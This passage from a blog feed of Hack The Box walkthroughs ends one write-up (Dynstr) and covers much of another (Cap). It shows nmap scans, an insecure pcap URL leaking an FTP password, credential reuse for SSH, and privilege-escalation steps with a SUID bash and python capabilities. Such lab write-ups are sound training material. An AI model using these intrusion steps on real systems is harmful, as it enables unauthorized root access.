<span class="o">[</span>+] Checking staged configuration.
<span class="o">[</span>-] ERROR: The generated configuration is not valid. Please fix following errors:
    /etc/bind/named.bindmgr/bash:1: unknown option <span class="s1">'ELF...'</span>
    /etc/bind/named.bindmgr/bash:14: unknown option <span class="s1">'hȀE'</span>
    /etc/bind/named.bindmgr/bash:40: unknown option <span class="s1">'YF'</span>
    /etc/bind/named.bindmgr/bash:40: unexpected token near <span class="s1">'}'</span>
</code></pre></div></div>

<ul>
  <li>Executed the <code class="language-plaintext highlighter-rouge">bash</code> binary with <code class="language-plaintext highlighter-rouge">-p</code> parameter, as stated in <a href="https://gtfobins.github.io/gtfobins/bash/#suid">bash | GTFOBins</a>, giving me an interactive shell as <code class="language-plaintext highlighter-rouge">root</code> and able to read contents of <code class="language-plaintext highlighter-rouge">/root/root.txt</code> file :smiley:</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bindmgr@dynstr:/tmp/tmp.7i6oryDsae<span class="nv">$ </span>/etc/bind/named.bindmgr/bash <span class="nt">-p</span>
bash-5.0# <span class="nb">ls</span> <span class="nt">-la</span>
total 1172
drwx------  2 bindmgr bindmgr    4096 Aug 16 19:10  <span class="nb">.</span>
drwxrwxrwt 13 root    root       4096 Aug 16 19:09  ..
<span class="nt">-rwsr-xr-x</span>  1 bindmgr bindmgr 1183448 Aug 16 19:10  bash
<span class="nt">-rw-rw-r--</span>  1 bindmgr bindmgr       1 Aug 16 19:10 <span class="s1">'--preserve=mode'</span>
<span class="nt">-rw-rw-r--</span>  1 bindmgr bindmgr       2 Aug 16 19:10  .version
bash-5.0# <span class="nb">cd</span> /root
bash-5.0# <span class="nb">cat </span>root.txt
&lt;redacted&gt;
</code></pre></div></div>

<p>I hope you guys have enjoyed it!</p>

<p>See you at the next post :smile:</p>]]></content><author><name>Davi Cruz</name></author><category term="Walkthrough" /><category term="HackTheBox" /><category term="HTB Medium" /><category term="HTB Linux" /><summary type="html"><![CDATA[Hello guys! This week’s machine will be Dynstr, another medium-rated Linux box from Hack The Box, created by jkr.]]></summary></entry><entry><title type="html">Walktrough: HTB Cap</title><link href="https://davicruz.com/walkthrough/2021/10/htb-cap" rel="alternate" type="text/html" title="Walktrough: HTB Cap" /><published>2021-10-02T13:00:00-03:00</published><updated>2021-10-02T13:00:00-03:00</updated><id>https://davicruz.com/walkthrough/2021/10/htb-cap</id><content type="html" xml:base="https://davicruz.com/walkthrough/2021/10/htb-cap"><![CDATA[<p>Hello guys!</p>

<p>This week’s machine will be <strong>Cap</strong>, another easy-rated Linux box from <a href="https://www.hackthebox.eu/">Hack The Box</a>, created by <a href="https://app.hackthebox.eu/users/52045">InfoSecJack</a>.<!--more--></p>

<p class="notice--info">:information_source: <strong>Info</strong>: Write-ups for Hack The Box machines are posted as soon as they’re retired.</p>

<p><img src="https://i.imgur.com/EP6oOn2.png" alt="HTB Cap" class="align-center" /></p>

<p>This box was very easy and demonstrates why we have to always secure communication while accessing services, which was the way we could get the credentials to escalate privileges to root.</p>

<h2 id="enumeration">Enumeration</h2>

<p>As usual, started with a <code class="language-plaintext highlighter-rouge">nmap</code> quick scan to list the currently published services.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> quick 10.10.10.245
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-10 20:04 <span class="nt">-03</span>
Nmap scan report <span class="k">for </span>10.10.10.245
Host is up <span class="o">(</span>0.073s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 <span class="o">(</span>RSA<span class="o">)</span>
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    gunicorn
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Tue, 10 Aug 2021 23:04:20 GMT
|     Connection: close
|     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
|     Content-Length: 232
|     &lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//W3C//DTD HTML 3.2 Final//EN"</span><span class="o">&gt;</span>
|     &lt;title&gt;404 Not Found&lt;/title&gt;
|     &lt;h1&gt;Not Found&lt;/h1&gt;
|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
|   GetRequest:
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Tue, 10 Aug 2021 23:04:15 GMT
|     Connection: close
|     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
|     Content-Length: 19386
|     &lt;<span class="o">!</span>DOCTYPE html&gt;
|     &lt;html <span class="nv">class</span><span class="o">=</span><span class="s2">"no-js"</span> <span class="nv">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="o">&gt;</span>
|     &lt;<span class="nb">head</span><span class="o">&gt;</span>
|     &lt;<span class="nb">head</span><span class="o">&gt;</span>
|     &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"utf-8"</span><span class="o">&gt;</span>
|     &lt;meta http-equiv<span class="o">=</span><span class="s2">"x-ua-compatible"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"ie=edge"</span><span class="o">&gt;</span>
|     &lt;title&gt;Security Dashboard&lt;/title&gt;
|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"viewport"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"width=device-width, initial-scale=1"</span><span class="o">&gt;</span>
|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"shortcut icon"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"image/png"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"/static/images/icon/favicon.ico"</span><span class="o">&gt;</span>
|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"/static/css/bootstrap.min.css"</span><span class="o">&gt;</span>
|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"/static/css/font-awesome.min.css"</span><span class="o">&gt;</span>
|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"/static/css/themify-icons.css"</span><span class="o">&gt;</span>
|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"/static/css/metisMenu.css"</span><span class="o">&gt;</span>
|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"/static/css/owl.carousel.min.css"</span><span class="o">&gt;</span>
|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"/static/css/slicknav.min.css"</span><span class="o">&gt;</span>
|     &lt;<span class="o">!</span><span class="nt">--</span> amchar
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Tue, 10 Aug 2021 23:04:15 GMT
|     Connection: close
|     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
|     Allow: GET, HEAD, OPTIONS
|     Content-Length: 0
|   RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     &lt;html&gt;
|     &lt;<span class="nb">head</span><span class="o">&gt;</span>
|     &lt;title&gt;Bad Request&lt;/title&gt;
|     &lt;/head&gt;
|     &lt;body&gt;
|     &lt;h1&gt;&lt;p&gt;Bad Request&lt;/p&gt;&lt;/h1&gt;
|     Invalid HTTP Version &amp;#x27<span class="p">;</span>Invalid HTTP Version: &amp;#x27<span class="p">;</span>RTSP/1.0&amp;#x27<span class="p">;</span>&amp;#x27<span class="p">;</span>
|     &lt;/body&gt;
|_    &lt;/html&gt;
|_http-server-header: gunicorn
|_http-title: Security Dashboard
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V<span class="o">=</span>7.91%I<span class="o">=</span>7%D<span class="o">=</span>8/10%Time<span class="o">=</span>611305F3%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>GetR
SF:equest,2FE5,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\x</span><span class="s2">20200</span><span class="se">\x</span><span class="s2">20OK</span><span class="se">\r\n</span><span class="s2">Server:</span><span class="se">\x</span><span class="s2">20gunicorn</span><span class="se">\r\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">20
SF:Tue,</span><span class="se">\x</span><span class="s2">2010</span><span class="se">\x</span><span class="s2">20Aug</span><span class="se">\x</span><span class="s2">202021</span><span class="se">\x</span><span class="s2">2023:04:15</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20close</span><span class="se">\r\</span><span class="s2">
SF:nContent-Type:</span><span class="se">\x</span><span class="s2">20text/html;</span><span class="se">\x</span><span class="s2">20charset=utf-8</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">20193
SF:86</span><span class="se">\r\n\r\n</span><span class="s2">&lt;!DOCTYPE</span><span class="se">\x</span><span class="s2">20html&gt;</span><span class="se">\n</span><span class="s2">&lt;html</span><span class="se">\x</span><span class="s2">20class=</span><span class="se">\"</span><span class="s2">no-js</span><span class="se">\"\x</span><span class="s2">20lang=</span><span class="se">\"</span><span class="s2">en</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\</span><span class="s2">
SF:n</span><span class="se">\n</span><span class="s2">&lt;head&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;meta</span><span class="se">\x</span><span class="s2">20charset=</span><span class="se">\"</span><span class="s2">utf-8</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">2
SF:0&lt;meta</span><span class="se">\x</span><span class="s2">20http-equiv=</span><span class="se">\"</span><span class="s2">x-ua-compatible</span><span class="se">\"\x</span><span class="s2">20content=</span><span class="se">\"</span><span class="s2">ie=edge</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\</span><span class="s2">
SF:x20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;title&gt;Security</span><span class="se">\x</span><span class="s2">20Dashboard&lt;/title&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;meta</span><span class="se">\</span><span class="s2">
SF:x20name=</span><span class="se">\"</span><span class="s2">viewport</span><span class="se">\"\x</span><span class="s2">20content=</span><span class="se">\"</span><span class="s2">width=device-width,</span><span class="se">\x</span><span class="s2">20initial-scale=
SF:1</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;link</span><span class="se">\x</span><span class="s2">20rel=</span><span class="se">\"</span><span class="s2">shortcut</span><span class="se">\x</span><span class="s2">20icon</span><span class="se">\"\x</span><span class="s2">20type=</span><span class="se">\"</span><span class="s2">image
SF:/png</span><span class="se">\"\x</span><span class="s2">20href=</span><span class="se">\"</span><span class="s2">/static/images/icon/favicon</span><span class="se">\.</span><span class="s2">ico</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;
SF:link</span><span class="se">\x</span><span class="s2">20rel=</span><span class="se">\"</span><span class="s2">stylesheet</span><span class="se">\"\x</span><span class="s2">20href=</span><span class="se">\"</span><span class="s2">/static/css/bootstrap</span><span class="se">\.</span><span class="s2">min</span><span class="se">\.</span><span class="s2">css</span><span class="se">\"</span><span class="s2">&gt;
SF:</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;link</span><span class="se">\x</span><span class="s2">20rel=</span><span class="se">\"</span><span class="s2">stylesheet</span><span class="se">\"\x</span><span class="s2">20href=</span><span class="se">\"</span><span class="s2">/static/css/fon
SF:t-awesome</span><span class="se">\.</span><span class="s2">min</span><span class="se">\.</span><span class="s2">css</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;link</span><span class="se">\x</span><span class="s2">20rel=</span><span class="se">\"</span><span class="s2">stylesheet</span><span class="se">\"\x</span><span class="s2">20
SF:href=</span><span class="se">\"</span><span class="s2">/static/css/themify-icons</span><span class="se">\.</span><span class="s2">css</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;link</span><span class="se">\x</span><span class="s2">20rel=
SF:</span><span class="se">\"</span><span class="s2">stylesheet</span><span class="se">\"\x</span><span class="s2">20href=</span><span class="se">\"</span><span class="s2">/static/css/metisMenu</span><span class="se">\.</span><span class="s2">css</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">2
SF:0&lt;link</span><span class="se">\x</span><span class="s2">20rel=</span><span class="se">\"</span><span class="s2">stylesheet</span><span class="se">\"\x</span><span class="s2">20href=</span><span class="se">\"</span><span class="s2">/static/css/owl</span><span class="se">\.</span><span class="s2">carousel</span><span class="se">\.</span><span class="s2">min</span><span class="se">\.</span><span class="s2">
SF:css</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;link</span><span class="se">\x</span><span class="s2">20rel=</span><span class="se">\"</span><span class="s2">stylesheet</span><span class="se">\"\x</span><span class="s2">20href=</span><span class="se">\"</span><span class="s2">/static/c
SF:ss/slicknav</span><span class="se">\.</span><span class="s2">min</span><span class="se">\.</span><span class="s2">css</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;!--</span><span class="se">\x</span><span class="s2">20amchar"</span><span class="o">)</span>%r<span class="o">(</span>HTTPOption
SF:s,B3,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\x</span><span class="s2">20200</span><span class="se">\x</span><span class="s2">20OK</span><span class="se">\r\n</span><span class="s2">Server:</span><span class="se">\x</span><span class="s2">20gunicorn</span><span class="se">\r\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">20Tue,</span><span class="se">\x</span><span class="s2">2
SF:010</span><span class="se">\x</span><span class="s2">20Aug</span><span class="se">\x</span><span class="s2">202021</span><span class="se">\x</span><span class="s2">2023:04:15</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20close</span><span class="se">\r\n</span><span class="s2">Conten
SF:t-Type:</span><span class="se">\x</span><span class="s2">20text/html;</span><span class="se">\x</span><span class="s2">20charset=utf-8</span><span class="se">\r\n</span><span class="s2">Allow:</span><span class="se">\x</span><span class="s2">20GET,</span><span class="se">\x</span><span class="s2">20HEAD,</span><span class="se">\x</span><span class="s2">20OP
SF:TIONS</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">200</span><span class="se">\r\n\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>RTSPRequest,121,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">2
SF:0400</span><span class="se">\x</span><span class="s2">20Bad</span><span class="se">\x</span><span class="s2">20Request</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20close</span><span class="se">\r\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20text
SF:/html</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">20196</span><span class="se">\r\n\r\n</span><span class="s2">&lt;html&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;head&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20
SF:</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;title&gt;Bad</span><span class="se">\x</span><span class="s2">20Request&lt;/title&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;/head&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;body&gt;</span><span class="se">\</span><span class="s2">
SF:n</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;h1&gt;&lt;p&gt;Bad</span><span class="se">\x</span><span class="s2">20Request&lt;/p&gt;&lt;/h1&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20Invali
SF:d</span><span class="se">\x</span><span class="s2">20HTTP</span><span class="se">\x</span><span class="s2">20Version</span><span class="se">\x</span><span class="s2">20&amp;#x27;Invalid</span><span class="se">\x</span><span class="s2">20HTTP</span><span class="se">\x</span><span class="s2">20Version:</span><span class="se">\x</span><span class="s2">20&amp;#x27;RTSP
SF:/1</span><span class="se">\.</span><span class="s2">0&amp;#x27;&amp;#x27;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;/body&gt;</span><span class="se">\n</span><span class="s2">&lt;/html&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>FourOhFourRequest,189
SF:,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\x</span><span class="s2">20404</span><span class="se">\x</span><span class="s2">20NOT</span><span class="se">\x</span><span class="s2">20FOUND</span><span class="se">\r\n</span><span class="s2">Server:</span><span class="se">\x</span><span class="s2">20gunicorn</span><span class="se">\r\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">20T
SF:ue,</span><span class="se">\x</span><span class="s2">2010</span><span class="se">\x</span><span class="s2">20Aug</span><span class="se">\x</span><span class="s2">202021</span><span class="se">\x</span><span class="s2">2023:04:20</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20close</span><span class="se">\r\n</span><span class="s2">
SF:Content-Type:</span><span class="se">\x</span><span class="s2">20text/html;</span><span class="se">\x</span><span class="s2">20charset=utf-8</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">20232</span><span class="se">\</span><span class="s2">
SF:r</span><span class="se">\n\r\n</span><span class="s2">&lt;!DOCTYPE</span><span class="se">\x</span><span class="s2">20HTML</span><span class="se">\x</span><span class="s2">20PUBLIC</span><span class="se">\x</span><span class="s2">20</span><span class="se">\"</span><span class="s2">-//W3C//DTD</span><span class="se">\x</span><span class="s2">20HTML</span><span class="se">\x</span><span class="s2">203</span><span class="se">\.</span><span class="s2">2</span><span class="se">\x</span><span class="s2">20
SF:Final//EN</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">&lt;title&gt;404</span><span class="se">\x</span><span class="s2">20Not</span><span class="se">\x</span><span class="s2">20Found&lt;/title&gt;</span><span class="se">\n</span><span class="s2">&lt;h1&gt;Not</span><span class="se">\x</span><span class="s2">20Found&lt;/h1&gt;
SF:</span><span class="se">\n</span><span class="s2">&lt;p&gt;The</span><span class="se">\x</span><span class="s2">20requested</span><span class="se">\x</span><span class="s2">20URL</span><span class="se">\x</span><span class="s2">20was</span><span class="se">\x</span><span class="s2">20not</span><span class="se">\x</span><span class="s2">20found</span><span class="se">\x</span><span class="s2">20on</span><span class="se">\x</span><span class="s2">20the</span><span class="se">\x</span><span class="s2">20ser
SF:ver</span><span class="se">\.\x</span><span class="s2">20If</span><span class="se">\x</span><span class="s2">20you</span><span class="se">\x</span><span class="s2">20entered</span><span class="se">\x</span><span class="s2">20the</span><span class="se">\x</span><span class="s2">20URL</span><span class="se">\x</span><span class="s2">20manually</span><span class="se">\x</span><span class="s2">20please</span><span class="se">\x</span><span class="s2">20ch
SF:eck</span><span class="se">\x</span><span class="s2">20your</span><span class="se">\x</span><span class="s2">20spelling</span><span class="se">\x</span><span class="s2">20and</span><span class="se">\x</span><span class="s2">20try</span><span class="se">\x</span><span class="s2">20again</span><span class="se">\.</span><span class="s2">&lt;/p&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>137.56 seconds
</code></pre></div></div>

<h3 id="80tcp---http-service">80/TCP - HTTP Service</h3>

<p>Observing the published page, we can see a monitoring dashboard with some options on the left.</p>

<p><img src="https://i.imgur.com/EVJpbpL.png" alt="HTB Cap - Security Dashboard" class="align-center" /></p>

<p>Inspecting the options provided in the left pane, the only interesting feature was the <em>Security Snapshot (5 Second PCAP + Analysis)</em>, which summarizes the package count received in the last interval. The panel option redirects us to <code class="language-plaintext highlighter-rouge">http://10.10.10.245/capture</code> and right after the 5-second interval, we’re redirected to the summarized data, as seen in the address bar <code class="language-plaintext highlighter-rouge">http://10.10.10.245/data/1</code>. On this page, you can also download the <code class="language-plaintext highlighter-rouge">pcap</code> file generated during the capture, which can be analyzed by yourself using a command line or graphical tools like Wireshark.</p>

<p><img src="https://i.imgur.com/YaUXZ83.png" alt="HTB Cap - Security Snapshot" class="align-center" /></p>

<p>An interesting point is that when I have requested another capture, the redirected URL provided was sequential (<code class="language-plaintext highlighter-rouge">http://10.10.10.245/data/2</code>), which implies that we could be able to see previous captures as well.</p>

<p>Considering that the counter is incrementing, we might have capture registered at “0” so manually changed the URL in the address bar and the stats below were displayed, indicating that we had some conversation and possibly, if communication is unencrypted, we would be able to obtain sensitive data from it.</p>

<p><img src="https://i.imgur.com/WWyXVKE.png" alt="HTB Cap - Security Snapshot &quot;zero&quot;" class="align-center" /></p>

<p>Analyzing its content using Wireshark, started analyzing the conversation statistics (<em>Statistics</em> &gt; <em>Conversations</em>), we can see below, having 3 HTTP conversations (80/TCP) and one FTP (21/TCP)</p>

<p><img src="https://i.imgur.com/XR922yh.png" alt="HTB Cap - PCAP Statistics" class="align-center" /></p>

<p>Analyzing each TCP Stream the most interesting one was the last (stream 3) which, in this FTP communication, we can see the credentials provided for user <strong>nathan</strong> and the retrieved file <code class="language-plaintext highlighter-rouge">notes.txt</code>, that could contain important information to us during this box resolution</p>

<blockquote>
  <p>nathan:Buck3tH4TF0RM3!</p>
</blockquote>

<p><img src="https://i.imgur.com/DQHsTTw.png" alt="HTB Cap - PCAP FTP Stream" class="align-center" /></p>

<h2 id="initial-access-and-user-flag">Initial access and User flag</h2>

<p>Using the observed credentials, was able to connect to FTP and surprisingly the root directory is at the user’s home directory, where I was able to retrieve the <code class="language-plaintext highlighter-rouge">user.txt</code> file and read the flag</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ftp 10.10.10.245
Connected to 10.10.10.245.
220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
Name <span class="o">(</span>10.10.10.245:zurc<span class="o">)</span>: nathan
331 Please specify the password.
Password:
230 Login successful.
Remote system <span class="nb">type </span>is UNIX.
Using binary mode to transfer files.
ftp&gt; <span class="nb">ls</span> <span class="nt">-la</span>
200 PORT <span class="nb">command </span>successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 1001     1001         4096 May 27 09:16 <span class="nb">.</span>
drwxr-xr-x    3 0        0            4096 May 23 19:17 ..
lrwxrwxrwx    1 0        0               9 May 15 21:40 .bash_history -&gt; /dev/null
<span class="nt">-rw-r--r--</span>    1 1001     1001          220 Feb 25  2020 .bash_logout
<span class="nt">-rw-r--r--</span>    1 1001     1001         3771 Feb 25  2020 .bashrc
drwx------    2 1001     1001         4096 May 23 19:17 .cache
<span class="nt">-rw-r--r--</span>    1 1001     1001          807 Feb 25  2020 .profile
lrwxrwxrwx    1 0        0               9 May 27 09:16 .viminfo -&gt; /dev/null
<span class="nt">-r--------</span>    1 1001     1001           33 Aug 11 16:25 user.txt
226 Directory send OK.
ftp&gt; get user.txt
<span class="nb">local</span>: user.txt remote: user.txt
200 PORT <span class="nb">command </span>successful. Consider using PASV.
150 Opening BINARY mode data connection <span class="k">for </span>user.txt <span class="o">(</span>33 bytes<span class="o">)</span><span class="nb">.</span>
226 Transfer complete.
33 bytes received <span class="k">in </span>0.00 secs <span class="o">(</span>358.0729 kB/s<span class="o">)</span>
ftp&gt; <span class="nb">exit
</span>221 Goodbye.

<span class="nv">$ </span><span class="nb">cat </span>user.txt
&lt;redacted&gt;
</code></pre></div></div>

<h2 id="root-flag">Root flag</h2>

<p>After reading the user’s flag, gave a try with the same credentials to connect via SSH and succeeded, allowing us to enumerate the box.</p>

<p>The first thing privesc command to be executed as always was <code class="language-plaintext highlighter-rouge">sudo -l</code> but for <code class="language-plaintext highlighter-rouge">nathan</code>’s account got nothing. Following with a manual enumeration decided to check if we have read access to the application directory, which is hosted in the default dir (<code class="language-plaintext highlighter-rouge">/var/www/html</code>) and is a python-based web app, from <code class="language-plaintext highlighter-rouge">app.py</code> file, to which nathan has write access.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nathan@cap:/var/www/html<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 32
drwxr-xr-x 6 nathan nathan 4096 May 25 07:25 <span class="nb">.</span>
drwxr-xr-x 3 root   root   4096 May 23 19:17 ..
drwxr-xr-x 2 nathan nathan 4096 May 27 09:10 __pycache__
<span class="nt">-rw-r--r--</span> 1 nathan nathan 4293 May 25 07:25 app.py
drwxr-xr-x 6 root   root   4096 May 23 19:17 static
drwxr-xr-x 2 root   root   4096 May 23 19:17 templates
drwxr-xr-x 2 root   root   4096 May 31 16:17 upload
</code></pre></div></div>

<p>As checking the functions on the file, noticed that it executes <code class="language-plaintext highlighter-rouge">tcpdump</code>, which normally requires <code class="language-plaintext highlighter-rouge">root</code> permissions to this task. This permission could also be leveraged to spawn a reverse shell as <code class="language-plaintext highlighter-rouge">root</code> to the attacker machine.</p>

<p>To test this, created another route in the app, with a custom path but to be effective I would need to recycle the flask website, not done automatically and this shouldn’t be the correct path to <code class="language-plaintext highlighter-rouge">root</code>.</p>

<p>Going a little deeper, decided to run <code class="language-plaintext highlighter-rouge">linpeas.sh</code> and found one configuration that could help us with this privilege escalation: there are some <strong>files with uncommon capabilities</strong>, which were validated later in GTFOBins:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
Current capabilities:
Current: =
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Shell capabilities:
0x0000000000000000=
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Files with capabilities (limited to 50):
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
